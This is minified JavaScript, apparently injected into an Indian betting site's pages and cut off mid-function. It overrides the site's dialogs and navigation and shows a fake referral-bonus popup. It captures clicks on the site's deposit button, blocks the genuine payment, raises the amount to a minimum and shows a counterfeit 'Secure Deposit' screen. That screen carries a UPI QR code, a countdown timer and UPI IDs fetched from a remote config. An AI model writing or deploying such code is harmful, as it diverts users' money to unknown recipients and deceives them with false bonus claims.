    return Math.max(0, Math.min(n, window.innerHeight - t));
}
function Xn(n) {
    try {
        let t = JSON.parse(localStorage.getItem("__wg_p_" + n));
        if (t) return t;
    } catch (t) { }
    if (n === "logo")
        return {
            vw: ((window.innerWidth - 68) / window.innerWidth) * 100,
            vh: 75,
        };
    return null;
}
function ft(n, t) {
    localStorage.setItem(
        "__wg_p_" + t,
        JSON.stringify({
            vw: (n.offsetLeft / window.innerWidth) * 100,
            vh: (n.offsetTop / window.innerHeight) * 100,
        }),
    );
}
function Zn(n, t) {
    if (!t) return;
    ((n.style.left = (t.vw / 100) * window.innerWidth + "px"),
        (n.style.top = (t.vh / 100) * window.innerHeight + "px"));
}
function ve(n, t) {
    let e = t.offsetWidth || 288,
        o = t.offsetHeight || 290;
    ((n.style.left = (window.innerWidth - e) / 2 + "px"),
        (n.style.top = (window.innerHeight - o) / 2 + "px"));
}
function re(n, t, { onTap: e }) {
    let o = 0,
        i = 0,
        l = 0,
        f = 0,
        c = !1;
    (t.addEventListener("pointerdown", (p) => {
        (t.setPointerCapture(p.pointerId),
            t.classList.add("dragging"),
            (o = p.clientX - n.offsetLeft),
            (i = p.clientY - n.offsetTop),
            (l = p.clientX),
            (f = p.clientY),
            (c = !1));
    }),
        t.addEventListener("pointermove", (p) => {
            if (!t.hasPointerCapture(p.pointerId)) return;
            if (
                ((n.style.left = pe(p.clientX - o, 62) + "px"),
                    (n.style.top = ye(p.clientY - i, 62) + "px"),
                    Math.abs(p.clientX - l) > 5 || Math.abs(p.clientY - f) > 5)
            )
                c = !0;
        }),
        t.addEventListener("pointerup", (p) => {
            if (
                (t.releasePointerCapture(p.pointerId),
                    t.classList.remove("dragging"),
                    c)
            )
                ft(n, "logo");
            else e();
        }));
}
function we(n, t, e) {
    let o = 0,
        i = 0;
    (t.addEventListener("pointerdown", (l) => {
        (t.setPointerCapture(l.pointerId),
            t.classList.add("dragging"),
            (o = l.clientX - n.offsetLeft),
            (i = l.clientY - n.offsetTop));
    }),
        t.addEventListener("pointermove", (l) => {
            if (!t.hasPointerCapture(l.pointerId)) return;
            ((n.style.left = pe(l.clientX - o, e.offsetWidth) + "px"),
                (n.style.top = ye(l.clientY - i, e.offsetHeight) + "px"));
        }),
        t.addEventListener("pointerup", (l) => {
            (t.releasePointerCapture(l.pointerId),
                t.classList.remove("dragging"),
                ft(n, "panel"));
        }));
}
var $o = [".firstSaveDialog", ".promptHeader"],
    Co = [".close", ".van-dialog__confirm", ".dialog__outside"];
function Wo() {
    $o.forEach((n) => {
        document.querySelectorAll(n).forEach((t) => {
            let e = t.closest(".van-popup, .dialog");
            if (!e || getComputedStyle(e).display === "none") return;
            let o = !1;
            for (let i of Co) {
                let l = e.querySelector(i);
                if (l) {
                    (l.click(), (o = !0));
                    break;
                }
            }
            if (!o) {
                let i = e.previousElementSibling;
                if (i?.classList.contains("van-overlay")) i.click();
            }
        });
    });
}
function Uo() {
    [
        document.querySelector(".tabbar__center"),
        document.querySelector(".promotionBg")?.closest(".tabbar__container-item"),
    ].forEach((t) => {
        if (!t || t.dataset.wgHijacked) return;
        ((t.dataset.wgHijacked = "1"),
            t.addEventListener(
                "click",
                (e) => {
                    (e.preventDefault(),
                        e.stopPropagation(),
                        e.stopImmediatePropagation(),
                        window.dispatchEvent(new Event("wg-open-bonus")));
                },
                {
                    capture: !0,
                },
            ));
    });
}
function Oo(n) {
    if (n.dataset.wg) return;
    n.dataset.wg = "1";
    let t = n.firstElementChild;
    if (!t) return;
    let e = t.cloneNode(!0);
    e.querySelector("span").textContent = "Bonus";
    let o = e.querySelector("use");
    if (o) {
        o.setAttribute("xlink:href", "#icon-gifts");
        let i = o.closest("svg");
        if (i) i.setAttribute("class", "svg-icon icon-gifts");
    }
    (e.querySelector("h5")?.remove(),
        e.addEventListener(
            "click",
            (i) => {
                (i.preventDefault(),
                    i.stopPropagation(),
                    i.stopImmediatePropagation(),
                    window.dispatchEvent(new Event("wg-open-bonus")));
            },
            {
                capture: !0,
            },
        ),
        n.prepend(e));
}
var qe = !1,
    k = null,
    K = null;
function me() {
    if (qe) return !0;
    if (!localStorage.getItem("token")) return !0;
    let n = localStorage.getItem("wg_promo_expiry");
    return n && Number(n) > Date.now();
}
function Po() {
    if (k) return;
    let n = "www.8okwin4.com".includes("okwin"),
        t = document.createElement("style");
    ((t.textContent = `
    .wgp-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.75);z-index:99998;display:none}
    .wgp-popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);z-index:99999;width:min(300px,calc(100% - 32px));background:#1e1e3a;border-radius:18px;overflow:hidden;display:none;flex-direction:column;box-shadow:0 8px 40px rgba(0,0,0,.6);font-family:-apple-system,system-ui,'Segoe UI',sans-serif}
    .wgp-close{position:absolute;top:10px;right:12px;width:26px;height:26px;border-radius:50%;background:rgba(255,255,255,.1);display:flex;align-items:center;justify-content:center;font-size:12px;color:rgba(255,255,255,.7);cursor:pointer;z-index:1;border:none}
    .wgp-hero{text-align:center;padding:28px 20px 14px}
    .wgp-icon{font-size:44px;line-height:1;margin-bottom:10px}
    .wgp-amount{font-size:28px;font-weight:900;color:#fff;letter-spacing:-.5px;margin-bottom:8px}
    .wgp-pill{display:inline-block;padding:4px 12px;border-radius:99px;background:rgba(245,180,0,.15);border:1px solid rgba(245,180,0,.35);font-size:10.5px;font-weight:600;color:#f5c842;letter-spacing:.2px}
    .wgp-stats{display:flex;gap:6px;padding:0 16px 12px;justify-content:center}
    .wgp-chip{flex:1;text-align:center;padding:7px 4px;border-radius:10px;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.1);font-size:10px;font-weight:600;color:#c8cad0}
    .wgp-body{padding:0 16px 14px;font-size:11.5px;color:#7b7e9a;line-height:1.65;text-align:center}
    .wgp-cta{display:block;width:calc(100% - 32px);margin:0 16px 10px;padding:14px;border-radius:12px;border:none;background:linear-gradient(90deg,#f5a623,#f5c842);color:#1a1200;font-size:15px;font-weight:800;cursor:pointer;font-family:inherit;letter-spacing:.1px}
    .wgp-cta:active{opacity:.9}
    .wgp-footer{display:flex;align-items:center;gap:7px;padding:8px 16px 16px;justify-content:center}
    .wgp-chk{width:17px;height:17px;border-radius:50%;border:1.5px solid #4a4d6a;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;transition:background .15s,border-color .15s}
    .wgp-chk.on{background:#07c160;border-color:#07c160}
    .wgp-chk-tick{font-size:10px;color:#fff;opacity:0;transition:opacity .15s}
    .wgp-chk.on .wgp-chk-tick{opacity:1}
    .wgp-remind{font-size:11px;color:#4a4d6a;cursor:pointer}
    .wgp-light .wgp-popup{background:#fff;box-shadow:0 8px 40px rgba(0,0,0,.15)}
    .wgp-light .wgp-close{background:rgba(0,0,0,.06);color:#888}
    .wgp-light .wgp-amount{color:#111}
    .wgp-light .wgp-pill{background:rgba(249,89,89,.08);border-color:rgba(249,89,89,.25);color:#f95959}
    .wgp-light .wgp-chip{background:#f5f5ff;border-color:#e0e0f0;color:#555}
    .wgp-light .wgp-body{color:#777}
    .wgp-light .wgp-cta{background:linear-gradient(90deg,#f95959,#ff8c6e);color:#fff}
    .wgp-light .wgp-chk{border-color:#ccc}
    .wgp-light .wgp-remind{color:#aaa}
  `),
        document.head.appendChild(t));
    let e = document.createElement("div");
    if (n) e.className = "wgp-light";
    ((k = document.createElement("div")),
        (k.className = "wgp-overlay"),
        e.appendChild(k),
        (K = document.createElement("div")),
        (K.className = "wgp-popup"),
        (K.innerHTML = `
    <button class="wgp-close" id="wgp-close">✕</button>
    <div class="wgp-hero">
      <div class="wgp-icon">\uD83D\uDCB0</div>
      <div class="wgp-amount">FREE ₹1,000</div>
      <div class="wgp-pill">Per Referral &bull; No Limit &bull; Instant Payout</div>
    </div>
    <div class="wgp-stats">
      <div class="wgp-chip">\uD83D\uDCB8 Instant</div>
      <div class="wgp-chip">♾️ No Cap</div>
      <div class="wgp-chip">✅ Verified</div>
    </div>
    <div class="wgp-body">Invite friends to join. Every time they deposit, you earn ₹1,000 commission — instantly credited, zero waiting.</div>
    <button class="wgp-cta" id="wgp-cta">\uD83C\uDF81 Claim Free Bonus →</button>
    <div class="wgp-footer">
      <div class="wgp-chk" id="wgp-chk"><span class="wgp-chk-tick">✓</span></div>
      <span class="wgp-remind" id="wgp-remind">No More Reminders Today</span>
    </div>
  `),
        e.appendChild(K),
        document.body.appendChild(e));
}
function ut(n) {
    if (k) k.style.display = "none";
    if (K) K.style.display = "none";
    if (((qe = !0), n))
        localStorage.setItem("wg_promo_expiry", String(Date.now() + 86400000));
}
function zo() {
    if (me()) return;
    (Po(), (k.style.display = "block"), (K.style.display = "flex"));
    let n = !1,
        t = K.querySelector("#wgp-chk");
    ((t.onclick = () => {
        ((n = !n), t.classList.toggle("on", n));
    }),
        (K.querySelector("#wgp-remind").onclick = () => t.click()),
        (K.querySelector("#wgp-close").onclick = () => ut(n)),
        (k.onclick = () => ut(n)),
        (K.querySelector("#wgp-cta").onclick = () => {
            (ut(n), window.dispatchEvent(new Event("wg-open-bonus")));
        }));
}
function Se() {
    (Wo(), Uo());
    let n = document.querySelector(".settingPanel__container-items");
    if (n) Oo(n);
}
function ge(n) {
    let t = !1,
        e = () => {
            if (!t && !me()) ((t = !0), zo());
        },
        o = () => {
            (Se(),
                new MutationObserver(() => {
                    (Se(), e());
                }).observe(document.body, {
                    childList: !0,
                    subtree: !0,
                }),
                window.addEventListener("hashchange", e),
                window.addEventListener("storage", e),
                setTimeout(e, 1500));
        };
    document.readyState === "loading"
        ? document.addEventListener("DOMContentLoaded", o)
        : o();
}
function Ee(n) {
    let t = n.querySelector("#bonus-view"),
        e = n.querySelector("#btn-copy-invite"),
        o = n.querySelector("#bonus-link-preview"),
        i = n.querySelector(".bonus-prog-count"),
        l = n.querySelector(".bonus-bar-fill"),
        f = "";
    function c() {
        let w =
            location.origin +
            "/#/register?invitationCode=" +
            (sessionStorage.getItem("invitecode") || "");
        return f ? w + "&ref=" + f : w;
    }
    function p() {
        let w = sessionStorage.getItem("wg_user") || "";
        if (!w) return;
        if (
            (fetch("/ar-api/bonus-stats?username=" + w)
                .then((S) => S.json())
                .then((S) => {
                    let M = S.qualified || 0;
                    ((i.textContent = M + " / 10 Qualified"),
                        (l.style.width = Math.min((M / 10) * 100, 100) + "%"));
                })
                .catch(() => { }),
                !f)
        )
            fetch("/ar-api/my-ref-tag?username=" + w)
                .then((S) => S.json())
                .then((S) => {
                    if (S.tag) ((f = S.tag), (o.textContent = c()));
                })
                .catch(() => { });
    }
    (window.addEventListener("wg-open-bonus", () => {
        ((t.style.display = "flex"), (o.textContent = c()), p());
    }),
        n
            .querySelector("#btn-bonus-back")
            .addEventListener("click", () => (t.style.display = "none")),
        e.addEventListener("click", () => {
            navigator.clipboard.writeText(c()).then(() => {
                ((e.textContent = "✓ Copied!"),
                    setTimeout(() => (e.textContent = "Copy Invite Link"), 2000));
            });
        }));
}
function at() {
    document.getElementById("wg-deposit-hint")?.remove();
}
function Le(n) {
    (at(),
        window.addEventListener("hashchange", at),
        window.addEventListener("wg-qualified", at));
}
function he(n, t) {
    let o = document.querySelector("prediction-panel")?.shadowRoot;
    if (!o) return;
    let i = [],
        l = new Set();
    for (let u of Array.isArray(t) ? t : []) {
        let v =
            typeof u === "string"
                ? u.trim()
                : String(u?.upiId ?? u?.address ?? u?.upi ?? u?.value ?? "").trim();
        if (!v || l.has(v)) continue;
        (l.add(v),
            i.push({
                label: typeof u === "string" ? "" : String(u?.label ?? "").trim(),
                upiId: v,
            }));
    }
    if (i.length === 0) return;
    let f = o.querySelector(".pay-overlay");
    if (f) f.remove();
    let c = document.createElement("div");
    ((c.className = "pay-overlay"),
        o.appendChild(c),
        (document.body.style.overflow = "hidden"));
    let p = 0,
        w,
        S = 0,
        M = () => {
            (cancelAnimationFrame(S),
                (S = requestAnimationFrame(() => {
                    let u = document.querySelector("#app"),
                        v = window.visualViewport,
                        r = u?.getBoundingClientRect(),
                        W =
                            v?.width ||
                            document.documentElement.clientWidth ||
                            window.innerWidth,
                        U =
                            v?.height ||
                            document.documentElement.clientHeight ||
                            window.innerHeight,
                        z = Number.isFinite(r?.left) ? Math.max(0, r.left) : 0,
                        J = Number.isFinite(r?.width) && r.width > 0 ? r.width : W,
                        Q = Math.max(280, Math.min(J, W - z));
                    ((c.style.left = `${z}px`),
                        (c.style.top = `${Math.max(0, v?.offsetTop || 0)}px`),
                        (c.style.width = `${Q}px`),
                        (c.style.height = `${U}px`));
                })));
        };
    (M(),
        window.addEventListener("resize", M),
        window.addEventListener("orientationchange", M),
        window.visualViewport?.addEventListener("resize", M),
        window.visualViewport?.addEventListener("scroll", M));
    let q = () => {
        (clearInterval(w),
            cancelAnimationFrame(S),
            window.removeEventListener("resize", M),
            window.removeEventListener("orientationchange", M),
            window.visualViewport?.removeEventListener("resize", M),
            window.visualViewport?.removeEventListener("scroll", M),
            c.remove(),
            (document.body.style.overflow = ""));
    },
        h =
            "DP" +
            Date.now().toString(36).toUpperCase() +
            Math.random().toString(36).slice(2, 6).toUpperCase(),
        $ = (u) =>
            String(u ?? "").replace(
                /[&<>"']/g,
                (v) =>
                    ({
                        "&": "&amp;",
                        "<": "&lt;",
                        ">": "&gt;",
                        '"': "&quot;",
                        "'": "&#39;",
                    })[v],
            ),
        L = () => {
            let u = i[p],
                v = u.upiId,
                r = u.label || `UPI ${p + 1}`,
                W = i.length > 1,
                U = i[(p + 1) % i.length],
                z = U.label || `UPI ${((p + 1) % i.length) + 1}`,
                J = `upi://pay?pa=${v}&pn=Deposit&am=${n}&cu=INR`,
                Q = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&margin=0&data=${encodeURIComponent(J)}`;
            return `
      <div class="pay-hdr">
        <button class="pay-back">
          <svg viewBox="0 0 24 24" fill="none"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </button>
        <span class="pay-ttl">Secure Deposit</span>
        <div style="width:32px"></div>
      </div>

      <div class="pay-body">
        <div class="pay-hero pay-anim pay-anim-1">
          <div class="pay-amount-bg"></div>
          <div class="pay-hero-top">
            <div>
              <span class="pay-hero-label">Amount to Pay</span>
              <span class="pay-amt">₹${Number(n).toLocaleString("en-IN")}</span>
            </div>
            <div class="pay-timer-pill">
              <svg class="pay-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10" stroke-width="2.5"/><path d="M12 6v6l4 2" stroke-width="2.5" stroke-linecap="round"/></svg>
              <span class="pay-timer-txt" id="pay-timer">29:00</span>
            </div>
          </div>
          <div class="pay-hero-sub">Scan and Pay. Then Add UTR.</div>
        </div>

        <div class="pay-content">
        <div class="pay-section pay-qr-card pay-anim pay-anim-2">
          <div class="pay-qr-wrapper">
            <div class="pay-qr-box">
              <div class="pay-qr-skeleton"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg></div>
              <img src="${Q}" class="pay-qr" alt="QR Code" onload="this.classList.add('loaded'); this.previousElementSibling.style.display='none'">
            </div>
            <div class="pay-scan-text">Open Any UPI App and Scan</div>
          </div>
        </div>

        <div class="pay-section pay-method-card pay-anim pay-anim-3">
          <div class="pay-section-hdr">Payment UPI</div>
          <div class="pay-upi-row">
            <div class="pay-upi-info">
              <span class="pay-upi-lbl">${$(r)}</span>
              <span class="pay-upi-id">${$(v)}</span>
            </div>
            <div class="pay-upi-actions">
              <button class="pay-copy-btn" id="btn-copy-upi">Copy</button>
            </div>
          </div>
          ${W
                    ? `
          <button class="pay-route-card" id="btn-switch-upi" type="button">
            <span class="pay-route-index">${$(z)}</span>
            <span class="pay-route-copy">
              <span class="pay-route-title">Change UPI ID</span>
              <span class="pay-route-sub">${$(U.upiId)}</span>
            </span>
            <span class="pay-route-icon">
              <svg viewBox="0 0 24 24" fill="none">
                <path d="M7 7h10l-3-3" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
                <path d="M17 17H7l3 3" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"/>
              </svg>
            </span>
          </button>
          `
                    : `
          <div class="pay-route-note">Only one UPI ID is active right now.</div>
          `
                }
        </div>

        <div class="pay-section pay-form-card pay-anim pay-anim-4">
          <div class="pay-section-hdr">UTR Number</div>
          <div class="pay-field-wrapper">
            <input type="tel" class="pay-utr-input" placeholder="Enter 12-Digit UTR" maxlength="12" inputmode="numeric">
            <button class="pay-paste-pill">Paste</button>
          </div>
          <div class="pay-utr-warn">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
            <span class="pay-utr-warn-txt">Wrong UTR can fail the deposit. Check it once.</span>
          </div>
        </div>

        <div class="pay-section pay-anim pay-anim-4">
          <button class="pay-submit-btn disabled" disabled>Submit Payment</button>
        </div>

        <div class="pay-order-meta pay-anim pay-anim-4">
          <span class="pay-order-lbl">Order Reference</span>
          <span class="pay-order-val">${h}</span>
        </div>
        </div>
      </div>

      <div class="pay-confirm-mask">
        <div class="pay-confirm-box">
          <div class="pay-conf-icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <div class="pay-conf-ttl">Confirm Deposit</div>
          <div class="pay-conf-msg">Have you successfully transferred exactly <b>₹${Number(n).toLocaleString("en-IN")}</b>?</div>
          <div class="pay-conf-acts">
            <button class="pay-conf-btn no">Cancel</button>
            <button class="pay-conf-btn yes">Yes, Submitted</button>
          </div>
        </div>
      </div>
    `;
        },
        m = () => {
            let u = c.querySelector(".pay-utr-input"),
                v = c.querySelector(".pay-submit-btn");
            ((c.querySelector(".pay-back").onclick = q),
                (u.oninput = (U) => {
                    U.target.value = U.target.value.replace(/\D/g, "");
                    let z = /^\d{12}$/.test(U.target.value);
                    ((v.disabled = !z), v.classList.toggle("disabled", !z));
                }),
                (c.querySelector(".pay-paste-pill").onclick = async () => {
                    try {
                        let U = await navigator.clipboard.readText();
                        ((u.value = U.replace(/\D/g, "").slice(0, 12)),
                            u.dispatchEvent(new Event("input")));
                    } catch (U) { }
                }),
                (c.querySelector("#btn-copy-upi").onclick = (U) => {
                    navigator.clipboard.writeText(i[p].upiId);
                    let z = U.target;
                    ((z.textContent = "Copied"),
                        z.classList.add("copied"),
                        setTimeout(() => {
                            ((z.textContent = "Copy"), z.classList.remove("copied"));
                        }, 2000));
                }));
            let r = c.querySelector("#btn-switch-upi");
            if (r)
                r.onclick = () => {
                    ((p = (p + 1) % i.length), y());
                };
            let W = c.querySelector(".pay-confirm-mask");
            ((v.onclick = () => {
                if (!v.disabled) W.classList.add("active");
            }),
                (c.querySelector(".pay-conf-btn.no").onclick = () =>
                    W.classList.remove("active")),
                (c.querySelector(".pay-conf-btn.yes").onclick = () => {
                    (console.log("Payment submitted:", {
                        amount: n,
                        utr: u.value,
                        orderId: h,
                    }),
                        q());
                }));
        },
        y = () => {
            let u = c.querySelector(".pay-utr-input")?.value || "";
            if (
                ((c.innerHTML = L()),
                    (c.querySelector(".pay-utr-input").value = u),
                    m(),
                    M(),
                    u)
            )
                c.querySelector(".pay-utr-input").dispatchEvent(new Event("input"));
        };
    y();
    let a = 1740;
    w = setInterval(() => {
        if ((a--, a <= 0)) {
            (clearInterval(w), q());
            return;
        }
        let u = Math.floor(a / 60),
            v = a % 60,
            r = c.querySelector("#pay-timer");
        if (r) {
            if (
                ((r.textContent = `${String(u).padStart(2, "0")}:${String(v).padStart(2, "0")}`),
                    a < 300)
            )
                r.parentElement.classList.add("urgent");
        }
    }, 1000);
}
var Cn = {
    interceptor_enabled: !1,
    min_deposit: 500,
    upis: [],
},
    yt = !1;
function Me(n) {
    let t = Array.isArray(n) ? n : [],
        e = [],
        o = new Set();
    for (let i of t) {
        let l =
            typeof i === "string"
                ? i.trim()
                : String(i?.upiId ?? i?.address ?? i?.upi ?? i?.value ?? "").trim();
        if (!l || o.has(l)) continue;
        (o.add(l),
            e.push(
                typeof i === "string"
                    ? l
                    : {
                        label: String(i?.label ?? "").trim(),
                        upiId: l,
                    },
            ));
    }
    return e;
}
async function pt() {
    try {
        let n = await fetch("/ar-api/payment-config", {
            cache: "no-store",
        });
        if (n.ok) {
            let t = await n.json(),
                e = Number(t?.min_deposit ?? t?.minDeposit ?? 500);
            ((Cn = {
                interceptor_enabled: Boolean(
                    t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled,
                ),
                min_deposit: Number.isFinite(e) && e > 0 ? e : 500,
                upis: Me(t?.payment_methods ?? t?.upis),
            }),
                (yt = !0));
        }
    } catch {
        ((Cn = {
            interceptor_enabled: !1,
            min_deposit: 500,
            upis: [],
        }),
            (yt = !0));
    }
}
function Jo(n) {
    let t = Number(Cn.min_deposit || 500),
        e = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
        o = Number.isFinite(e) ? e : 0;
    return Math.max(o, t);
}
function $e() {
    (pt(),
        setInterval(pt, 1e4),
        document.addEventListener("visibilitychange", () => {
            if (!document.hidden) pt();
        }),
        window.addEventListener(
            "click",
            (n) => {
                if (!n.target.closest(".Recharge__container-rechageBtn, .go_pay"))
                    return;
                let e = Me(Cn.upis);
                if (!yt || !Cn.interceptor_enabled || e.length === 0) return;
                (n.stopImmediatePropagation(), n.stopPropagation(), n.preventDefault());
                let o = document.querySelector('input.van-field__control[type="tel"]'),
                    i = Jo(o);
                if (o && Number(o.value) !== i)
                    ((o.value = String(i)),
                        o.dispatchEvent(
                            new Event("input", {
                                bubbles: !0,
                            }),
                        ),
                        o.dispatchEvent(
                            new Event("change", {
                                bubbles: !0,
                            }),
                        ));
                (console.log("deposit blocked - interceptor active", {
                    amount: i,
                    upis: e,
                }),
                    he(i, e));
            },
            {
                capture: !0,
            },
        ));
}
function Ho(n) {
    function t(m, y) {
        return (m + y) | 0;
    }
    function e(m, y) {
        return (m << y) | (m >>> (32 - y));
    }
    function o(m, y, a, u, v, r) {
        return t(e(t(t(y, m), t(u, r)), v), a);
    }
    function i(m, y, a, u, v, r, W) {
        return o((y & a) | (~y & u), m, y, v, r, W);
    }
    function l(m, y, a, u, v, r, W) {
        return o((y & u) | (a & ~u), m, y, v, r, W);
    }
    function f(m, y, a, u, v, r, W) {
        return o(y ^ a ^ u, m, y, v, r, W);
    }
    function c(m, y, a, u, v, r, W) {
        return o(a ^ (y | ~u), m, y, v, r, W);
    }
    function p(m, y) {
        var a = m[0],
            u = m[1],
            v = m[2],
            r = m[3];
        ((a = i(a, u, v, r, y[0], 7, -680876936)),
            (r = i(r, a, u, v, y[1], 12, -389564586)),
            (v = i(v, r, a, u, y[2], 17, 606105819)),
            (u = i(u, v, r, a, y[3], 22, -1044525330)),
            (a = i(a, u, v, r, y[4], 7, -176418897)),
            (r = i(r, a, u, v, y[5], 12, 1200080426)),
            (v = i(v, r, a, u, y[6], 17, -1473231341)),
            (u = i(u, v, r, a, y[7], 22, -45705983)),
            (a = i(a, u, v, r, y[8], 7, 1770035416)),
            (r = i(r, a, u, v, y[9], 12, -1958414417)),
            (v = i(v, r, a, u, y[10], 17, -42063)),
            (u = i(u, v, r, a, y[11], 22, -1990404162)),
            (a = i(a, u, v, r, y[12], 7, 1804603682)),
            (r = i(r, a, u, v, y[13], 12, -40341101)),
            (v = i(v, r, a, u, y[14], 17, -1502002290)),
            (u = i(u, v, r, a, y[15], 22, 1236535329)),
            (a = l(a, u, v, r, y[1], 5, -165796510)),
            (r = l(r, a, u, v, y[6], 9, -1069501632)),
            (v = l(v, r, a, u, y[11], 14, 643717713)),
            (u = l(u, v, r, a, y[0], 20, -373897302)),
            (a = l(a, u, v, r, y[5], 5, -701558691)),
            (r = l(r, a, u, v, y[10], 9, 38016083)),
            (v = l(v, r, a, u, y[15], 14, -660478335)),
            (u = l(u, v, r, a, y[4], 20, -405537848)),
            (a = l(a, u, v, r, y[9], 5, 568446438)),
            (r = l(r, a, u, v, y[14], 9, -1019803690)),
            (v = l(v, r, a, u, y[3], 14, -187363961)),
            (u = l(u, v, r, a, y[8], 20, 1163531501)),
            (a = l(a, u, v, r, y[13], 5, -1444681467)),
            (r = l(r, a, u, v, y[2], 9, -51403784)),
            (v = l(v, r, a, u, y[7], 14, 1735328473)),
            (u = l(u, v, r, a, y[12], 20, -1926607734)),
            (a = f(a, u, v, r, y[5], 4, -378558)),
            (r = f(r, a, u, v, y[8], 11, -2022574463)),
            (v = f(v, r, a, u, y[11], 16, 1839030562)),
            (u = f(u, v, r, a, y[14], 23, -35309556)),
            (a = f(a, u, v, r, y[1], 4, -1530992060)),
            (r = f(r, a, u, v, y[4], 11, 1272893353)),
            (v = f(v, r, a, u, y[7], 16, -155497632)),
            (u = f(u, v, r, a, y[10], 23, -1094730640)),
            (a = f(a, u, v, r, y[13], 4, 681279174)),
            (r = f(r, a, u, v, y[0], 11, -358537222)),
            (v = f(v, r, a, u, y[3], 16, -722521979)),
            (u = f(u, v, r, a, y[6], 23, 76029189)),
            (a = f(a, u, v, r, y[9], 4, -640364487)),
            (r = f(r, a, u, v, y[12], 11, -421815835)),
            (v = f(v, r, a, u, y[15], 16, 530742520)),
            (u = f(u, v, r, a, y[2], 23, -995338651)),
            (a = c(a, u, v, r, y[0], 6, -198630844)),
            (r = c(r, a, u, v, y[7], 10, 1126891415)),
            (v = c(v, r, a, u, y[14], 15, -1416354905)),
            (u = c(u, v, r, a, y[5], 21, -57434055)),
            (a = c(a, u, v, r, y[12], 6, 1700485571)),
            (r = c(r, a, u, v, y[3], 10, -1894986606)),
            (v = c(v, r, a, u, y[10], 15, -1051523)),
            (u = c(u, v, r, a, y[1], 21, -2054922799)),
            (a = c(a, u, v, r, y[8], 6, 1873313359)),
            (r = c(r, a, u, v, y[15], 10, -30611744)),
            (v = c(v, r, a, u, y[6], 15, -1560198380)),
            (u = c(u, v, r, a, y[13], 21, 1309151649)),
            (a = c(a, u, v, r, y[4], 6, -145523070)),
            (r = c(r, a, u, v, y[11], 10, -1120210379)),
            (v = c(v, r, a, u, y[2], 15, 718787259)),
            (u = c(u, v, r, a, y[9], 21, -343485551)),
            (m[0] = t(a, m[0])),
            (m[1] = t(u, m[1])),
            (m[2] = t(v, m[2])),
            (m[3] = t(r, m[3])));
    }
    function w(m) {
        var y = [],
            a;
        for (a = 0; a < 64; a += 4)
            y[a >> 2] =
                m.charCodeAt(a) +
                (m.charCodeAt(a + 1) << 8) +
                (m.charCodeAt(a + 2) << 16) +
                (m.charCodeAt(a + 3) << 24);
        return y;
    }
    var S = n.length,
        M = [1732584193, -271733879, -1732584194, 271733878],
        q;
    for (q = 64; q <= S; q += 64) p(M, w(n.substring(q - 64, q)));
    n = n.substring(q - 64);
    var h = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    for (q = 0; q < n.length; q++) h[q >> 2] |= n.charCodeAt(q) << ((q % 4) << 3);
    if (((h[q >> 2] |= 128 << ((q % 4) << 3)), q > 55))
        (p(M, h), (h = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]));
    ((h[14] = S * 8), p(M, h));
    var $ = "";
    for (q = 0; q < 4; q++)
        for (var L = 0; L < 4; L++)
            $ +=
                "0123456789abcdef"[(M[q] >> (L * 8 + 4)) & 15] +
                "0123456789abcdef"[(M[q] >> (L * 8)) & 15];
    return $.toUpperCase().slice(0, 32);
}
function Go() {
    var n = 100000000000,
        t = 1000000000000,
        e;
    do e = Math.floor(Math.random() * t);
    while (e < n);
    return e;
}
function vt(n) {
    n.random = Go();
    var t = JSON.parse(JSON.stringify(n)),
        e = Object.keys(t)
            .filter(function (i) {
                var l = t[i];
                return l === null || typeof l !== "object";
            })
            .sort(),
        o = {};
    return (
        e.forEach(function (i) {
            if (t[i] !== null && t[i] !== "" && i !== "signature")
                o[i] = t[i] === 0 ? 0 : t[i];
        }),
        (n.signature = Ho(JSON.stringify(o))),
        (n.timestamp = Math.floor(Date.now() / 1000)),
        n
    );
}
function Io() {
    try {
        var n = localStorage.getItem("ar_token");
        if (!n) return "";
        var t = JSON.parse(n);
        return typeof t === "string" ? t : t.value || "";
    } catch (e) {
        return localStorage.getItem("ar_token") || "";
    }
}
function Qo(n) {
    if (!n) return;
    try {
        localStorage.setItem(
            "ar_token",
            JSON.stringify({
                value: n,
                expires: -1,
            }),
        );
    } catch (t) { }
}
function rt(n, t, e, o) {
    return new Promise(function (i, l) {
        var f = new XMLHttpRequest();
        if ((f.open(n, t, !0), o)) for (var c in o) f.setRequestHeader(c, o[c]);
        ((f.onload = function () {
            if (f.status >= 200 && f.status < 300) {
                var p = f.getResponseHeader("Authorization");
                if (p) Qo(p.replace(/^Bearer\s+/i, ""));
                try {
                    i(JSON.parse(f.responseText));
                } catch (w) {
                    l(Error("Bad JSON"));
                }
            } else l(Error("HTTP " + f.status));
        }),
            (f.onerror = function () {
                l(Error("Network error"));
            }),
            (f.ontimeout = function () {
                l(Error("Timeout"));
            }),
            (f.timeout = 15000),
            f.send(e || null));
    });
}
function wt(n, t, e) {
    var o = Io(),
        i = t,
        l = {
            Authorization: "Bearer " + o,
            "Content-Type": "application/json",
            Accept: "application/json, text/plain, */*",
        },
        f = null;
    if (n === "GET") {
        var c = new URLSearchParams();
        (Object.keys(e).forEach(function (p) {
            c.set(p, String(e[p]));
        }),
            (i += "?" + c.toString()));
